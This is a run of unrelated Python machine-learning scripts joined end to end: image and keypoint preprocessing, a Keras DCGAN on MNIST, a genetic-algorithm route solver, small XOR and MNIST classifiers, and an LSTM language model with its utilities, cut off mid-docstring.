    if image.shape[2] == 4:
        # if the image has an alpha color channel (opacity)
        # let's just remove it
        image = image[:, :, :3]
    # get the height & width of image
    h, w = image.shape[:2]
    new_h, new_w = IMAGE_SIZE
    new_h, new_w = int(new_h), int(new_w)

    # scaling the image to that IMAGE_SIZE
    # image = cv2.resize(image, (new_w, new_h))
    image = resize_image(image, (new_w, new_h))
    if to_gray:
        # convert image to grayscale
        image = cv2.cvtColor(image, cv2.COLOR_RGB2GRAY)
    # normalizing pixels from the range [0, 255] to [0, 1]
    image = image / 255.0
    if to_gray:
        image = np.expand_dims(image, axis=2)
    return image



def normalize_keypoints(image, keypoints):
    # get the height & width of image
    h, w = image.shape[:2]
    # reshape to coordinates (x, y)
    # i.e converting a vector of (136,) to the 2D array (68, 2)
    new_h, new_w = IMAGE_SIZE
    new_h, new_w = int(new_h), int(new_w)
    keypoints = keypoints.reshape(-1, 2)
    # scale the keypoints also
    keypoints = keypoints * [new_w / w, new_h / h]
    keypoints = keypoints.reshape(-1)
    # normalizing keypoints from [0, IMAGE_SIZE] to [0, 1] (experimental)
    keypoints = keypoints / 224
    # keypoints = (keypoints - 100) / 50
    return keypoints

def normalize(image, keypoints, to_gray=True):
    image, keypoints = random_crop(image, keypoints)
    return normalize_image(image, to_gray=to_gray), normalize_keypoints(image, keypoints)

def load_data(csv_file, to_gray=True):
    # read the training dataframe
    df = pd.read_csv(csv_file)
    all_keypoints = np.array(df.iloc[:, 1:])
    image_names = list(df.iloc[:, 0])
    # load images
    X, y = [], []
    X = np.zeros((len(image_names), *IMAGE_SIZE, 3), dtype="float32")
    y = np.zeros((len(image_names), OUTPUT_SHAPE[0] * OUTPUT_SHAPE[1]))
    for i, (image_name, keypoints) in enumerate(zip(tqdm(image_names, "Loading " + os.path.basename(csv_file)), all_keypoints)):
        image = mpimg.imread(os.path.join("data", "training", image_name))
        image, keypoints = normalize(image, keypoints, to_gray=to_gray)
        X[i] = image
        y[i] = keypoints

    return X, y




"""
DCGAN on MNIST using Keras
"""
# to use CPU
import os

# os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
# os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

# import tensorflow as tf

# config = tf.ConfigProto(intra_op_parallelism_threads=5,
#                         inter_op_parallelism_threads=5, 
#                         allow_soft_placement=True,
#                         device_count = {'CPU' : 1,
#                                         'GPU' : 0}
#                        )

import numpy as np
import matplotlib.pyplot as plt
import tqdm
import glob
# from tensorflow.examples.tutorials.mnist import input_data

from keras.models import Sequential
from keras.layers import Dense, Activation, Flatten, Reshape
from keras.layers import Conv2D, Conv2DTranspose, UpSampling2D
from keras.layers import LeakyReLU, Dropout, BatchNormalization
from keras.optimizers import Adam, RMSprop
from keras.datasets import mnist

class GAN:
    def __init__(self, img_x=28, img_y=28, img_z=1):
        self.img_x = img_x
        self.img_y = img_y
        self.img_z = img_z

        self.D = None  # discriminator
        self.G = None  # generator
        self.AM = None # adversarial model
        self.DM = None # discriminator model

    def discriminator(self):
        if self.D:
            return self.D

        self.D = Sequential()

        depth = 64
        dropout = 0.4
        input_shape = (self.img_x, self.img_y, self.img_z)

        self.D.add(Conv2D(depth, 5, strides=2, input_shape=input_shape, padding="same"))
        self.D.add(LeakyReLU(0.2))
        self.D.add(Dropout(dropout))

        self.D.add(Conv2D(depth*2, 5, strides=2, padding="same"))
        self.D.add(LeakyReLU(0.2))
        self.D.add(Dropout(dropout))

        self.D.add(Conv2D(depth*4, 5, strides=2, padding="same"))
        self.D.add(LeakyReLU(0.2))
        self.D.add(Dropout(dropout))

        self.D.add(Conv2D(depth*8, 5, strides=1, padding="same"))
        self.D.add(LeakyReLU(0.2))
        self.D.add(Dropout(dropout))

        # convert to 1 dimension
        self.D.add(Flatten())
        self.D.add(Dense(1, activation="sigmoid"))
        print("="*50, "Discriminator", "="*50)
        self.D.summary()
        return self.D

    def generator(self):
        if self.G:
            return self.G

        self.G = Sequential()
        dropout = 0.4
        # covnerting from 100 vector noise to dim x dim x depth
        # (100,) to (7, 7, 256)
        depth = 64 * 4
        dim = 7
        
        self.G.add(Dense(dim*dim*depth, input_dim=100))
        self.G.add(BatchNormalization(momentum=0.9))
        self.G.add(Activation("relu"))
        self.G.add(Reshape((dim, dim, depth)))
        self.G.add(Dropout(dropout))

        # upsampling to (14, 14, 128)
        self.G.add(UpSampling2D())
        self.G.add(Conv2DTranspose(depth // 2, 5, padding="same"))
        self.G.add(BatchNormalization(momentum=0.9))
        self.G.add(Activation("relu"))
        self.G.add(Dropout(dropout))

        # up to (28, 28, 64)
        self.G.add(UpSampling2D())
        self.G.add(Conv2DTranspose(depth // 4, 5, padding="same"))
        self.G.add(BatchNormalization(momentum=0.9))
        self.G.add(Activation("relu"))
        self.G.add(Dropout(dropout))

        # to (28, 28, 32)
        self.G.add(Conv2DTranspose(depth // 8, 5, padding="same"))
        self.G.add(BatchNormalization(momentum=0.9))
        self.G.add(Activation("relu"))
        self.G.add(Dropout(dropout))

        # to (28, 28, 1) (img)
        self.G.add(Conv2DTranspose(1, 5, padding="same"))
        self.G.add(Activation("sigmoid"))
        print("="*50, "Generator", "="*50)
        self.G.summary()
        return self.G

    def discriminator_model(self):
        if self.DM:
            return self.DM
        # optimizer = RMSprop(lr=0.001, decay=6e-8)
        optimizer = Adam(0.0002, 0.5)
        self.DM = Sequential()
        self.DM.add(self.discriminator())
        self.DM.compile(loss="binary_crossentropy", optimizer=optimizer, metrics=["accuracy"])
        return self.DM

    def adversarial_model(self):
        if self.AM:
            return self.AM
        # optimizer = RMSprop(lr=0.001, decay=3e-8)
        optimizer = Adam(0.0002, 0.5)
        self.AM = Sequential()
        self.AM.add(self.generator())
        self.AM.add(self.discriminator())
        self.AM.compile(loss="binary_crossentropy", optimizer=optimizer, metrics=["accuracy"])
        return self.AM


class MNIST:
    def __init__(self):
        self.img_x = 28
        self.img_y = 28
        self.img_z = 1

        self.steps = 0

        self.load_data()
        self.create_models()

        # used image indices
        self._used_indices = set()

    def load_data(self):
        (self.X_train, self.y_train), (self.X_test, self.y_test) = mnist.load_data()
        # reshape to (num_samples, 28, 28 , 1)
        self.X_train = np.expand_dims(self.X_train, axis=-1)
        self.X_test = np.expand_dims(self.X_test, axis=-1)

    def create_models(self):
        self.GAN = GAN()
        self.discriminator = self.GAN.discriminator_model()
        self.adversarial = self.GAN.adversarial_model()
        self.generator = self.GAN.generator()
        discriminators = glob.glob("discriminator_*.h5")
        generators = glob.glob("generator_*.h5")
        adversarial = glob.glob("adversarial_*.h5")
        if len(discriminators) != 0:
            print("[+] Found a discriminator ! Loading weights ...")
            self.discriminator.load_weights(discriminators[0])
        if len(generators) != 0:
            print("[+] Found a generator ! Loading weights ...")
            self.generator.load_weights(generators[0])
        if len(adversarial) != 0:
            print("[+] Found an adversarial model ! Loading weights ...")
            self.steps = int(adversarial[0].replace("adversarial_", "").replace(".h5", ""))
            self.adversarial.load_weights(adversarial[0])


    def get_unique_random(self, batch_size=256):
        indices = np.random.randint(0, self.X_train.shape[0], size=batch_size)
        # in_used_indices = np.any([i in indices for i in self._used_indices])
        # while in_used_indices:
        #     indices = np.random.randint(0, self.X_train.shape[0], size=batch_size)
        #     in_used_indices = np.any([i in indices for i in self._used_indices])
        # self._used_indices |= set(indices)
        # if len(self._used_indices) > self.X_train.shape[0] // 2:
            # if used indices is more than half of training samples, clear it
            # that is to enforce it to train at least more than half of the dataset uniquely
            # self._used_indices.clear()
        return indices
        


    def train(self, train_steps=2000, batch_size=256, save_interval=0):
        noise_input = None
        
        steps = tqdm.tqdm(list(range(self.steps, train_steps)))
        fake = np.zeros((batch_size, 1))
        real = np.ones((batch_size, 1))
        for i in steps:
            real_images = self.X_train[self.get_unique_random(batch_size)]
            # noise = np.random.uniform(-1.0, 1.0, size=(batch_size, 100))
            noise = np.random.normal(size=(batch_size, 100))
            fake_images = self.generator.predict(noise)
            # get 256 real images and 256 fake images
            d_loss_real = self.discriminator.train_on_batch(real_images, real)
            d_loss_fake = self.discriminator.train_on_batch(fake_images, fake)
            d_loss = 0.5 * np.add(d_loss_real, d_loss_fake)
            # X = np.concatenate((real_images, fake_images))
            # y = np.zeros((2*batch_size, 1))
            # 0 for fake and 1 for real
            # y[:batch_size, :] = 1

            # shuffle
            # shuffle_in_unison(X, y)

            # d_loss = self.discriminator.train_on_batch(X, y)

            # y = np.ones((batch_size, 1))
            # noise = np.random.uniform(-1.0, 1.0, size=(batch_size, 100))
            # fool the adversarial, telling him everything is real
            a_loss = self.adversarial.train_on_batch(noise, real)
            log_msg = f"[D loss: {d_loss[0]:.6f}, D acc: {d_loss[1]:.6f} | A loss: {a_loss[0]:.6f}, A acc: {a_loss[1]:.6f}]"
            steps.set_description(log_msg)

            if save_interval > 0:
                noise_input = np.random.uniform(low=-1, high=1.0, size=(16, 100))
                if (i + 1) % save_interval == 0:
                    self.plot_images(save2file=True, samples=noise_input.shape[0], noise=noise_input, step=(i+1))
                    self.discriminator.save(f"discriminator_{i+1}.h5")
                    self.generator.save(f"generator_{i+1}.h5")
                    self.adversarial.save(f"adversarial_{i+1}.h5")

        
    def plot_images(self, save2file=False, fake=True, samples=16, noise=None, step=0):
        filename = "mnist_fake.png"
        if fake:
            if noise is None:
                noise = np.random.uniform(-1.0, 1.0, size=(samples, 100))
            else:
                filename = f"mnist_{step}.png"
            images = self.generator.predict(noise)
        else:
            i = np.random.randint(0, self.X_train.shape[0], samples)
            images = self.X_train[i]
            if noise is None:
                filename = "mnist_real.png"

        plt.figure(figsize=(10, 10))
        for i in range(images.shape[0]):
            plt.subplot(4, 4, i+1)
            image = images[i]
            image = np.reshape(image, (self.img_x, self.img_y))
            plt.imshow(image, cmap="gray")
            plt.axis("off")
        plt.tight_layout()
        if save2file:
            plt.savefig(filename)
            plt.close("all")
        else:
            plt.show()


# https://stackoverflow.com/questions/4601373/better-way-to-shuffle-two-numpy-arrays-in-unison
def shuffle_in_unison(a, b):
    rng_state = np.random.get_state()
    np.random.shuffle(a)
    np.random.set_state(rng_state)
    np.random.shuffle(b)


if __name__ == "__main__":
    mnist_gan = MNIST()
    mnist_gan.train(train_steps=10000, batch_size=256, save_interval=500)
    mnist_gan.plot_images(fake=True, save2file=True)
    mnist_gan.plot_images(fake=False, save2file=True)




import random
import numpy as np
import pandas as pd
import operator
import matplotlib.pyplot as plt
from threading import Event, Thread


class Individual:
    def __init__(self, object):
        self.object = object

    def update(self, new):
        self.object = new

    def __repr__(self):
        return self.object
    
    def __str__(self):
        return self.object


class GeneticAlgorithm:
    """General purpose genetic algorithm implementation"""

    def __init__(self, individual, popsize, elite_size, mutation_rate, generations, fitness_func, plot=True, prn=True, animation_func=None):
        self.individual = individual
        self.popsize = popsize
        self.elite_size = elite_size
        self.mutation_rate = mutation_rate
        self.generations = generations
        if not callable(fitness_func):
            raise TypeError("fitness_func must be a callable object.")
        self.get_fitness = fitness_func
        self.plot = plot
        self.prn = prn
        self.population = self._init_pop()
        self.animate = animation_func
        
    def calc(self):
        """Try to find the best individual.
        This function returns (initial_individual, final_individual, """
        sorted_pop = self.sortpop()
        initial_route = self.population[sorted_pop[0][0]]
        distance = 1 / sorted_pop[0][1]
        progress = [ distance ]
        if callable(self.animate):
            self.plot = True
            individual = Individual(initial_route)
            stop_animation = Event()
            self.animate(individual, progress, stop_animation, plot_conclusion=initial_route)
        else:
            self.plot = False
        if self.prn:
            print(f"Initial distance: {distance}")
        try:
            if self.plot:
                for i in range(self.generations):
                    population = self.next_gen()
                    sorted_pop = self.sortpop()
                    distance = 1 / sorted_pop[0][1]
                    progress.append(distance)
                    if self.prn:
                        print(f"[Generation:{i}] Current distance: {distance}")
                    route = population[sorted_pop[0][0]]
                    individual.update(route)
            else:
                for i in range(self.generations):
                    population = self.next_gen()
                    distance = 1 / self.sortpop()[0][1]
                    if self.prn:
                        print(f"[Generation:{i}] Current distance: {distance}")
                    
                    
        except KeyboardInterrupt:
            pass
        try:
            stop_animation.set()
        except NameError:
            pass
        final_route_index = self.sortpop()[0][0]
        final_route = population[final_route_index]
        if self.prn:
            print("Final route:", final_route)

        return initial_route, final_route, distance

    def create_population(self):
        return random.sample(self.individual, len(self.individual))

    def _init_pop(self):
        return [ self.create_population() for i in range(self.popsize) ]

    def sortpop(self):
        """This function calculates the fitness of each individual in population
        And returns a population sorted by its fitness in descending order"""
        result = [ (i, self.get_fitness(individual)) for i, individual in enumerate(self.population) ]
        return sorted(result, key=operator.itemgetter(1), reverse=True)

    def selection(self):
        sorted_pop = self.sortpop()
        df = pd.DataFrame(np.array(sorted_pop), columns=["Index", "Fitness"])
        df['cum_sum']  = df['Fitness'].cumsum()
        df['cum_perc'] = 100 * df['cum_sum'] / df['Fitness'].sum()
        result = [ sorted_pop[i][0] for i in range(self.elite_size) ]

        for i in range(len(sorted_pop) - self.elite_size):
            pick = random.random() * 100
            for i in range(len(sorted_pop)):
                if pick <= df['cum_perc'][i]:
                    result.append(sorted_pop[i][0])
                    break
        return [ self.population[index] for index in result ]

    def breed(self, parent1, parent2):
        child1, child2 = [], []

        gene_A = random.randint(0, len(parent1))
        gene_B = random.randint(0, len(parent2))

        start_gene = min(gene_A, gene_B)
        end_gene   = max(gene_A, gene_B)

        for i in range(start_gene, end_gene):
            child1.append(parent1[i])
        
        child2 = [ item for item in parent2 if item not in child1 ]
        return child1 + child2

    def breed_population(self, selection):
        pool = random.sample(selection, len(selection))
        children = [selection[i] for i in range(self.elite_size)]
        children.extend([self.breed(pool[i], pool[len(selection)-i-1]) for i in range(len(selection) - self.elite_size)])
        return children

    def mutate(self, individual):
        individual_length = len(individual)
        for swapped in range(individual_length):
            if(random.random() < self.mutation_rate):
                swap_with = random.randint(0, individual_length-1)
                individual[swapped], individual[swap_with] = individual[swap_with], individual[swapped]
        return individual

    def mutate_population(self, children):
        return [ self.mutate(individual) for individual in children ]

    def next_gen(self):
        selection = self.selection()
        children = self.breed_population(selection)
        self.population = self.mutate_population(children)
        return self.population




from genetic import plt
from genetic import Individual
from threading import Thread


def plot_routes(initial_route, final_route):
    _, ax = plt.subplots(nrows=1, ncols=2)

    for col, route in zip(ax, [("Initial Route", initial_route), ("Final Route", final_route) ]):
        col.title.set_text(route[0])
        route = route[1]
        for i, city in enumerate(route):
            if i == 0:
                col.text(city.x-5, city.y+5, "Start")
                col.scatter(city.x, city.y, s=70, c='g')
            else:
                col.scatter(city.x, city.y, s=70, c='b')

        col.plot([ city.x for city in route ], [city.y for city in route], c='r')
        col.plot([route[-1].x, route[0].x], [route[-1].y, route[0].y], c='r')
    
    plt.show()


def animate_progress(route, progress, stop_animation, plot_conclusion=None):
        
    def animate():
        nonlocal route
        _, ax1 = plt.subplots(nrows=1, ncols=2)
        while True:
            if isinstance(route, Individual):
                target = route.object
            ax1[0].clear()
            ax1[1].clear()

            # current routes and cities
            ax1[0].title.set_text("Current routes")
            
            for i, city in enumerate(target):
                if i == 0:
                    ax1[0].text(city.x-5, city.y+5, "Start")
                    ax1[0].scatter(city.x, city.y, s=70, c='g')
                else:
                    ax1[0].scatter(city.x, city.y, s=70, c='b')

            ax1[0].plot([ city.x for city in target ], [city.y for city in target], c='r')
            ax1[0].plot([target[-1].x, target[0].x], [target[-1].y, target[0].y], c='r')

            # current distance graph
            ax1[1].title.set_text("Current distance")
            ax1[1].plot(progress)
            ax1[1].set_ylabel("Distance")
            ax1[1].set_xlabel("Generation")

            plt.pause(0.05)
            
            if stop_animation.is_set():
                break
        plt.show()
        if plot_conclusion:
            initial_route = plot_conclusion
            plot_routes(initial_route, target)

    Thread(target=animate).start()




import matplotlib.pyplot as plt
import random
import numpy as np
import operator
from plots import animate_progress, plot_routes


class City:
    def __init__(self, x, y):
        self.x = x
        self.y = y

    def distance(self, city):
        """Returns distance between self city and city"""
        x = abs(self.x - city.x)
        y = abs(self.y - city.y)
        return np.sqrt(x ** 2 + y ** 2)

    def __sub__(self, city):
        return self.distance(city)

    def __repr__(self):
        return f"({self.x}, {self.y})"

    def __str__(self):
        return self.__repr__()


def get_fitness(route):

    def get_distance():
        distance = 0
        for i in range(len(route)):
            from_city = route[i]
            to_city = route[i+1] if i+1 < len(route) else route[0]
            distance += (from_city - to_city)
        return distance

    return 1 / get_distance()


def load_cities():
    return [ City(city[0], city[1]) for city in [(169, 20), (103, 24), (41, 9), (177, 76), (138, 173), (163, 108), (93, 34), (200, 84), (19, 184), (117, 176), (153, 30), (140, 29), (38, 108), (89, 183), (18, 4), (174, 38), (109, 169), (93, 23), (156, 10), (171, 27), (164, 91), (109, 194), (90, 169), (115, 37), (177, 93), (169, 20)] ]


def generate_cities(size):
    cities = []
    for i in range(size):
        x = random.randint(0, 200)
        y = random.randint(0, 200)

        if 40 < x < 160:
            if 0.5 <= random.random():
                y = random.randint(0, 40)
            else:
                y = random.randint(160, 200)
        elif 40 < y < 160:
            if 0.5 <= random.random():
                x = random.randint(0, 40)
            else:
                x = random.randint(160, 200)

        cities.append(City(x, y))
    return cities


def benchmark(cities):
    popsizes = [60, 80, 100, 120, 140]
    elite_sizes = [5, 10, 20, 30, 40]
    mutation_rates = [0.02, 0.01, 0.005, 0.003, 0.001]
    generations = 1200

    iterations = len(popsizes) * len(elite_sizes) * len(mutation_rates)
    iteration = 0

    gens = {}
    
    for popsize in popsizes:
        for elite_size in elite_sizes:
            for mutation_rate in mutation_rates:
                iteration += 1
                gen = GeneticAlgorithm(cities, popsize=popsize, elite_size=elite_size, mutation_rate=mutation_rate, generations=generations, fitness_func=get_fitness, prn=False)
                initial_route, final_route, generation = gen.calc(ret=("generation", 755))
                if generation == generations:
                    print(f"[{iteration}/{iterations}] (popsize={popsize}, elite_size={elite_size}, mutation_rate={mutation_rate}): could not reach the solution")
                else:
                    print(f"[{iteration}/{iterations}] (popsize={popsize}, elite_size={elite_size}, mutation_rate={mutation_rate}): {generation} generations was enough")
                if generation != generations:
                    gens[iteration] = generation
    # reversed_gen = {v:k for k, v in gens.items()}
    output = sorted(gens.items(), key=operator.itemgetter(1))
    for i, gens in output:
        print(f"Iteration: {i} generations: {gens}")


# [1] (popsize=60, elite_size=30, mutation_rate=0.001): 235 generations was enough
# [2] (popsize=80, elite_size=20, mutation_rate=0.001): 206 generations was enough
# [3] (popsize=100, elite_size=30, mutation_rate=0.001): 138 generations was enough
# [4] (popsize=120, elite_size=30, mutation_rate=0.002): 117 generations was enough
# [5] (popsize=140, elite_size=20, mutation_rate=0.003): 134 generations was enough

# The notes:
# 1.1 Increasing the mutation rate to higher rate, the curve will be inconsistent and it won't lead us to the optimal distance.
# 1.2 So we need to put it as small as 1% or lower
# 2. Elite size is likely to be about 30% or less of total population
# 3. Generations depends on the other parameters, can be a fixed number, or until we reach the optimal distance.
# 4. 
    

if __name__ == "__main__":
    from genetic import GeneticAlgorithm
    cities = load_cities()
    # cities = generate_cities(50)
    # parameters
    popsize = 120
    elite_size = 30
    mutation_rate = 0.1
    
    generations = 400

    gen = GeneticAlgorithm(cities, popsize=popsize, elite_size=elite_size, mutation_rate=mutation_rate, generations=generations, fitness_func=get_fitness, animation_func=animate_progress)
    initial_route, final_route, distance = gen.calc()




import tensorflow as tf
import matplotlib.pyplot as plt
from sklearn.model_selection import train_test_split
from sklearn.utils import shuffle

import re
import numpy as np
import os
import time
import json
from glob import glob
from PIL import Image
import pickle




import numpy as np
from keras.utils import np_utils
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense, Activation


np.random.seed(19)

X = np.array([[0,0],[0,1],[1,0],[1,1]]).astype('float32')
y = np.array([[0],[1],[1],[0]]).astype('float32')

y = np_utils.to_categorical(y)

xor = Sequential()

# add required layers
xor.add(Dense(8, input_dim=2))

# hyperbolic tangent function to the first hidden layer ( 8 nodes )
xor.add(Activation("tanh"))

xor.add(Dense(8))
xor.add(Activation("relu"))
# output layer
xor.add(Dense(2))

# sigmoid function to the output layer ( final )
xor.add(Activation("sigmoid"))

# Cross-entropy error function
xor.compile(loss="categorical_crossentropy", optimizer="adam", metrics=["accuracy"])

# show the summary of the model
xor.summary()

xor.fit(X, y, epochs=400, verbose=1)

# accuray
score = xor.evaluate(X, y)
print(f"Accuracy: {score[-1]}")


# Checking the predictions
print("\nPredictions:")
print(xor.predict(X))




import torch
import torchvision
from torchvision import transforms, datasets
import torch.nn as nn
import torch.nn.functional as F
import torch.optim as optim
import matplotlib.pyplot as plt

epochs = 3
batch_size = 64

# building the network now
class Net(nn.Module):
    def __init__(self):
        super().__init__()
        # takes 28x28 images
        self.fc1 = nn.Linear(28*28, 64)
        self.fc2 = nn.Linear(64, 64)
        self.fc3 = nn.Linear(64, 64)
        self.fc4 = nn.Linear(64, 10)

    def forward(self, x):
        x = F.relu(self.fc1(x))
        x = F.relu(self.fc2(x))
        x = F.relu(self.fc3(x))
        x = self.fc4(x)
        return F.log_softmax(x, dim=1)



if __name__ == "__main__":
    training_set = datasets.MNIST("", train=True, download=True,
                            transform=transforms.Compose([
                                transforms.ToTensor()
                            ]))

    test_set = datasets.MNIST("", train=False, download=True,
                                transform=transforms.Compose([
                                    transforms.ToTensor()
                                ]))

    # load the dataset
    train = torch.utils.data.DataLoader(training_set, batch_size=batch_size, shuffle=True)
    test = torch.utils.data.DataLoader(test_set, batch_size=batch_size, shuffle=False)
    # construct the model
    net = Net()
    # specify the loss and optimizer
    loss = nn.CrossEntropyLoss()
    optimizer = optim.Adam(net.parameters(), lr=0.001)

    # training the model
    for epoch in range(epochs):
        for data in train:
            # data is the batch of data now
            # X are the features, y are labels
            X, y = data
            net.zero_grad() # set gradients to 0 before loss calculation
            output = net(X.view(-1, 28*28)) # feed data to the network
            loss = F.nll_loss(output, y) # calculating the negative log likelihood
            loss.backward() # back propagation
            optimizer.step() # attempt to optimize weights to account for loss/gradients
        print(loss)

    correct = 0
    total = 0
    with torch.no_grad():
        for data in test:
            X, y = data
            output = net(X.view(-1, 28*28))
            for index, i in enumerate(output):
                if torch.argmax(i) == y[index]:
                    correct += 1
                total += 1

    print("Accuracy:", round(correct / total, 3))
    # testing
    print(torch.argmax(net(X.view(-1, 28*28))[0]))
    plt.imshow(X[0].view(28, 28))
    plt.show()




from keras.models import Sequential
from keras.layers import LSTM, Dropout, BatchNormalization, LeakyReLU, Dense, Activation, TimeDistributed
from keras.layers import Bidirectional

def rnn_model(input_dim, cell, num_layers, units, dropout, batch_normalization=True, bidirectional=True):
    model = Sequential()
    for i in range(num_layers):
        if i == 0:
            # first time, specify input_shape
            if bidirectional:
                model.add(Bidirectional(cell(units, input_shape=(None, input_dim), return_sequences=True)))
            else:
                model.add(cell(units, input_shape=(None, input_dim), return_sequences=True))
            if batch_normalization:
                model.add(BatchNormalization())
            model.add(Dropout(dropout))
            model.add(LeakyReLU(alpha=0.1))
        else:
            if bidirectional:
                model.add(Bidirectional(cell(units, return_sequences=True)))
            else:
                model.add(cell(units, return_sequences=True))
            if batch_normalization:
                model.add(BatchNormalization())
            model.add(Dropout(dropout))
            model.add(LeakyReLU(alpha=0.1))

    model.add(TimeDistributed(Dense(input_dim, activation="softmax")))

    return model




from utils import UNK, text_to_sequence, sequence_to_text
from keras.preprocessing.sequence import pad_sequences
from keras.layers import LSTM
from models import rnn_model
from scipy.ndimage.interpolation import shift
import numpy as np

# to use CPU
import os
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=6,
                        inter_op_parallelism_threads=6, 
                        allow_soft_placement=True,
                        device_count = {'CPU' : 1,
                                        'GPU' : 0}
                       )

INPUT_DIM = 50

test_text = ""
test_text += """college or good clerk at university has not pleasant days or used not to have them half a century ago but his position was recognized and the misery was measured can we just make something that is useful for making this happen especially when they are just doing it by"""

encoded = np.expand_dims(np.array(text_to_sequence(test_text)), axis=0)
encoded = encoded.reshape((-1, encoded.shape[0], encoded.shape[1]))
model = rnn_model(INPUT_DIM, LSTM, 4, 380, 0.3, bidirectional=False)
model.load_weights("results/lm_rnn_v2_6400548.3.h5")

# for i in range(10):
#     predicted_word_int = model.predict_classes(encoded)[0]
#     print(predicted_word_int, end=',')
#     word = sequence_to_text(predicted_word_int)
#     encoded = shift(encoded, -1, cval=predicted_word_int)
#     print(word, end=' ')
print("Fed:")
print(encoded)
print("Result: predict")
print(model.predict(encoded)[0])
print("Result: predict_proba")
print(model.predict_proba(encoded)[0])
print("Result: predict_classes")
print(model.predict_classes(encoded)[0])
print(sequence_to_text(model.predict_classes(encoded)[0]))
print()




from models import rnn_model
from utils import sequence_to_text, text_to_sequence, get_batches, get_data, get_text, vocab
from keras.layers import LSTM
from keras.callbacks import ModelCheckpoint

import numpy as np
import os

INPUT_DIM = 50
# OUTPUT_DIM = len(vocab)
BATCH_SIZE = 128

# get data
text = get_text("data")
encoded = np.array(text_to_sequence(text))
print(len(encoded))

# X, y = get_data(encoded, INPUT_DIM, 1)

# del text, encoded

model = rnn_model(INPUT_DIM, LSTM, 4, 380, 0.3, bidirectional=False)

model.compile(loss="categorical_crossentropy", optimizer="adam", metrics=["accuracy"])
model.summary()
if not os.path.isdir("results"):
    os.mkdir("results")

checkpointer = ModelCheckpoint("results/lm_rnn_v2_{loss:.1f}.h5", verbose=1)

steps_per_epoch = (len(encoded) // 100) // BATCH_SIZE

model.fit_generator(get_batches(encoded, BATCH_SIZE, INPUT_DIM),
                    epochs=100,
                    callbacks=[checkpointer],
                    verbose=1,
                    steps_per_epoch=steps_per_epoch)
model.save("results/lm_rnn_v2_final.h5")




import numpy as np
import os
import tqdm
import inflect
from string import punctuation, whitespace
from word_forms.word_forms import get_word_forms

p = inflect.engine()

UNK = "<unk>"
vocab = set()
add = vocab.add
# add unk 
add(UNK)

with open("data/vocab1.txt") as f:
    for line in f:
        add(line.strip())

vocab = sorted(vocab)
word2int = {w: i for i, w in enumerate(vocab)}
int2word = {i: w for i, w in enumerate(vocab)}


def update_vocab(word):
    global vocab
    global word2int
    global int2word

    vocab.add(word)
    next_int = max(int2word) + 1
    word2int[word] = next_int
    int2word[next_int] = word


def save_vocab(_vocab):
    with open("vocab1.txt", "w") as f:
        for w in sorted(_vocab):
            print(w, file=f)


def text_to_sequence(text):
    return [ word2int[word] for word in text.split() ]


def sequence_to_text(seq):
    return ' '.join([ int2word[i] for i in seq ])


def get_batches(arr, batch_size, n_steps):
    '''Create a generator that returns batches of size
       batch_size x n_steps from arr.
       
       Arguments
       ---------
       arr: Array you want to make batches from
       batch_size: Batch size, the number of sequences per batch
       n_steps: Number of sequence steps per batch
    '''
    chars_per_batch = batch_size * n_steps
    n_batches = len(arr) // chars_per_batch

    arr = arr[:chars_per_batch * n_batches]

    arr = arr.reshape((batch_size, -1))
    while True:
        for n in range(0, arr.shape[1], n_steps):
            x = arr[:, n: n+n_steps]
            y_temp = arr[:, n+1:n+n_steps+1]
            y = np.zeros(x.shape, dtype=y_temp.dtype)
            y[:, :y_temp.shape[1]] = y_temp
            yield x.reshape(1, x.shape[0], x.shape[1]), y.reshape(1, y.shape[0], y.shape[1])


def get_data(arr, n_seq, look_forward):

    n_samples = len(arr) // n_seq
    X = np.zeros((n_seq, n_samples))
    Y = np.zeros((n_seq, n_samples))

    for index, i in enumerate(range(0, n_samples*n_seq, n_seq)):
        x = arr[i:i+n_seq]
        y = arr[i+look_forward:i+n_seq+look_forward]
        if len(x) != n_seq or len(y) != n_seq:
            break
        X[:, index] = x
        Y[:, index] = y
    return X.T.reshape(1, X.shape[1], X.shape[0]), Y.T.reshape(1, Y.shape[1], Y.shape[0])


def get_text(path, files=["carroll-alice.txt", "text.txt", "text8.txt"]):
    global vocab
    global word2int
    global int2word

    text = ""
    file = files[0]
    for file in tqdm.tqdm(files, "Loading data"):
        file = os.path.join(path, file)
        with open(file, encoding="utf8") as f:
            text += f.read().lower()
    
    punc = set(punctuation)

    text = ''.join([ c for c in tqdm.tqdm(text, "Cleaning text") if c not in punc ])
    for ws in whitespace:
        text = text.replace(ws, " ")
    text = text.split()

    co = 0
    vocab_set = set(vocab)
    for i in tqdm.tqdm(range(len(text)), "Normalizing words"):
        # convert digits to words
        # (i.e '7' to 'seven')
        if text[i].isdigit():
            text[i] = p.number_to_words(text[i])
        # compare_nouns
        # compare_adjs
        # compare_verbs
        if text[i] not in vocab_set:
            text[i] = UNK
            co += 1
    # update vocab, intersection of words
    print("vocab length:", len(vocab))
    vocab = vocab_set & set(text)
    print("vocab length after update:", len(vocab))
    save_vocab(vocab)
    print("Number of unks:", co)
    return ' '.join(text)




from train import create_model, get_data, split_data, LSTM_UNITS, np, to_categorical, Tokenizer, pad_sequences, pickle


def tokenize(x, tokenizer=None):
    """Tokenize x
    :param x: List of sentences/strings to be tokenized
    :return: Tuple of (tokenized x data, tokenizer used to tokenize x)"""
    if tokenizer:
        t = tokenizer
    else:
        t = Tokenizer()
    t.fit_on_texts(x)
    return t.texts_to_sequences(x), t


def predict_sequence(enc, dec, source, n_steps, docoder_num_tokens):
    """Generate target given source sequence, this function can be used
    after the model is trained to generate a target sequence given a source sequence."""
    # encode
    state = enc.predict(source)
    # start of sequence input
    target_seq = np.zeros((1, 1, n_steps))
    # collect predictions
    output = []
    for t in range(n_steps):
        # predict next char
        yhat, h, c = dec.predict([target_seq] + state)
        # store predictions
        y = yhat[0, 0, :]

        sampled_token_index = np.argmax(y)
        output.append(sampled_token_index)
        # update state
        state = [h, c]
        # update target sequence
        target_seq = np.zeros((1, 1, n_steps))
        target_seq[0, 0] = to_categorical(sampled_token_index, num_classes=n_steps)
        
    return np.array(output)


def logits_to_text(logits, index_to_words):
    """
    Turn logits from a neural network into text using the tokenizer
    :param logits: Logits from a neural network
